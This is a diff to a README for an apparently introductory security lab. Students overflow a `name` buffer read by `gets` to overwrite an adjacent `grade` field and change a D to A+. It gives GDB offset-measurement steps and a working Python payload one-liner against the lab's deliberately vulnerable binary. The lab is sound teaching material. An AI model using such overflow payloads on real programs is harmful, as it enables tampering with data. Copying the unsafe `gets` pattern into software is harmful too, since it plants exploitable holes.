@@ -4,11 +4,13 @@ You are stuck with a grade of **D**. The program stores your `grade` right
 next to your `name` in memory, and it reads your name with an unsafe function
 that never checks how much you type. Overflow `name` to overwrite `grade`.
 
-**Win condition:** make the program print
+**Win condition:** make the program print something like
 
 ```text
-Hi YOUR_NAME! Your grade is A+.
+user   : YOUR_NAME
+  grade  : A+
 
+*** ACCESS GRANTED :: GRADE OVERRIDE COMPLETE ***
 *** LEVEL 1 CLEARED ***
 ```
 
@@ -20,8 +22,11 @@ You do **not** edit `vulnerable.c`. You only craft the input you send it.
 
 ```bash
 make
-file vulnerable      # should say: ELF 32-bit ... Intel 80386
+file vulnerable      # must say: ELF 32-bit ... Intel 80386
 ```
+
+**Read the compiler warnings** (especially about `gets`). That warning is the
+point: the function is unsafe on purpose.
 
 ## Step 2 — Play it straight first
 
@@ -32,64 +37,66 @@ file vulnerable      # should say: ELF 32-bit ... Intel 80386
 Type a short name. Notice the grade stays `D`. Now try a very long name
 (20+ characters). What happened to the grade? Why?
 
-## Step 3 — Find the offset in GDB
+## Step 3 — Measure in GDB
 
-The point of this level is to *measure*, not guess: how far is `grade` from the
-start of `name`? Inspect the struct layout with GDB:
+On the 32-bit UTM VM, live GDB works. Measure — do not guess:
 
 ```bash
-gdb -q -batch -ex "ptype /o student_t" ./vulnerable
+gdb ./vulnerable
 ```
-
-You'll see each field's offset:
 
 ```text
-type = struct {
-/*      0      |      16 */    char name[16];
-/*     16      |       4 */    char grade[4];
-}
+(gdb) break main
+(gdb) run
+(gdb) next
+(gdb) next
+(gdb) print &student.name
+(gdb) print &student.grade
+(gdb) print (char *)&student.grade - (char *)&student.name
+(gdb) quit
 ```
 
-That left column is the **offset**: `name` starts at 0, `grade` starts at 16.
-So you must write 16 bytes to fill `name` before `A+` lands on `grade`.
+You can also inspect the type layout without running:
 
-> Note on environments: on Apple Silicon Macs, the Docker container emulates
-> x86 and cannot *run* a program under GDB (`break`/`run`/`step` fail with
-> `ptrace: Function not implemented`). Static inspection like `ptype /o` and
-> `disassemble` still works, which is all you need for this level. For full
-> live debugging (stepping, live stack addresses) use a real x86 Linux box —
-> a course server or an x86 VM (see the top-level README).
+```bash
+gdb -q -batch -ex "ptype /o student_cse_29" ./vulnerable
+```
+
+Example layout:
+
+```text
+/*      0      |      16 */    char name[16];
+/*     16      |       4 */    char grade[4];
+```
+
+That offset (**16**) is how many bytes from the start of `name` to `grade`.
 
 ## Step 4 — Craft the payload
 
 Your input needs to:
 
-1. put your name in `name`,
-2. place a `'\0'` right after your name (so `printf("%s", name)` stops there),
-3. pad with filler until you have written OFFSET bytes total,
+1. put your username in `name`,
+2. place a `'\0'` right after it (so `%s` stops printing the name cleanly),
+3. pad until you have written OFFSET bytes total,
 4. then write `A+` so it lands on `grade`.
 
-Template (replace `NAME` and the padding count from your GDB offset):
+Template:
 
 ```bash
 python3 -c 'import sys; sys.stdout.buffer.write(b"NAME\x00" + b"A"*PAD + b"A+")' | ./vulnerable
 ```
 
-Worked example (name = `nawab`, offset = 16):
+Worked example (name = `nawab`, offset = 16 → pad = 10):
 
 ```bash
 python3 -c 'import sys; sys.stdout.buffer.write(b"nawab\x00" + b"A"*10 + b"A+")' | ./vulnerable
 ```
 
-`nawab\x00` = 6 bytes, `A`*10 = 10 bytes → 16 bytes fill `name`, then `A+`
-lands on `grade`.
-
 ## Step 5 — Submit
 
-- The exact input (or Python one-liner) that clears the level.
-- Your GDB output showing `&name`, `&grade`, and the offset.
-- 3–4 sentences: where the overflow is, and how `name` sits relative to
-  `grade` in memory.
+- The exact input (or Python one-liner) that clears the level
+- Your GDB notes (`&name`, `&grade`, offset)
+- 3–4 sentences: where the overflow is, and how `name` sits relative to `grade`
 
 ---
 
